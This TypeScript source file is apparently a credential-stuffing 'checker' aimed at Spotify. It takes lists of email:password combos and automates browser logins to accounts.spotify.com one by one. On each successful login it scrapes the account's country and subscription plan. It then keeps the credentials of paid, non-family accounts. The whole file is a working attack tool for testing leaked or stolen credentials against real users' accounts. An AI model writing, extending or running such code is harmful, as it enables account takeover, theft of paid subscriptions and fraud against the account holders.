import { createBrowser } from './createBrowser';
import { TestJobOptions } from './types';

const SPOTIFY_URL = 'https://www.spotify.com';
const SPOTIFY_ACCOUNTS_URL = 'https://accounts.spotify.com';

export type SpotifyJobResult = {
    email: string;
    password: string;
    country: string;
    productName: string;
    productDesc: string;
};

export async function testSpotify(opts: TestJobOptions<SpotifyJobResult>) {
    const onProgress = opts.onProgress || (() => {});

    const accounts = opts.combos.map(combo => combo.split(':'));
    const results = [];

    const browser = await createBrowser(opts.browser);
    const page = await browser.newPage();

    for (let i = 0; i < accounts.length; i++) {
        try {
            const [email, password] = accounts[i];

            if (!email || !password) {
                console.warn(
                    'no email or password was parsed for combo index %i, combo: %O',
                    i,
                    opts.combos[i]
                );
                continue;
            }

            onProgress({
                value: (i / accounts.length) * 100,
                status: `Testing combo ${email}:${password}...`
            });

            await page.goto(SPOTIFY_ACCOUNTS_URL);
            await page.evaluate(
                async (email, password) => {
                    const scope = (window as any).angular
                        .element(document.body)
                        .scope();

                    scope.form.username = email;
                    scope.form.password = password;
                    scope.form.remember = false;

                    scope.$digest();
                },
                email,
                password
            );
            await page.click('button');

            const res = await page.waitForResponse(
                `${SPOTIFY_ACCOUNTS_URL}/api/login`,
                { timeout: 8000 }
            );

            if (!res.ok()) {
                try {
                    const { error } = await res.json();

                    if (error !== 'errorInvalidCredentials') {
                        console.log('unexpected login failure: %O', {
                            email,
                            password,
                            error
                        });
                    }
                } catch (e) {
                    console.log('failed to login %O, bad response: %O', e, res);
                }

                continue;
            }

            await page.waitForNavigation();
            await page.goto(`${SPOTIFY_URL}/accounts/overview`);

            const { country, productName, productDesc } = await page.evaluate(
                () => {
                    const productDescEl = document.querySelector(
                        '.subscription > p'
                    ) as HTMLElement;

                    return {
                        country: document.getElementById('card-profile-country')
                            .innerText,
                        productName: (document.querySelector(
                            '.subscription > h3'
                        ) as HTMLElement).innerText,
                        productDesc: productDescEl
                            ? productDescEl.innerText
                            : ''
                    };
                }
            );

            if (
                !productName.includes('Free') &&
                !productDesc.includes('member of a family plan') &&
                !productDesc.includes('plan is associated')
            ) {
                const result = {
                    email,
                    password,
                    country,
                    productName,
                    productDesc
                };

                if (opts.onResult) {
                    opts.onResult(result);
                } else {
                    results.push(result);
                }
            }

            await page.goto(`${SPOTIFY_URL}/logout`);
        } catch (e) {
            console.warn('unexpected error:', e);
        }
    }

    await browser.close();

    if (!opts.onResult) {
        return results;
    }
}
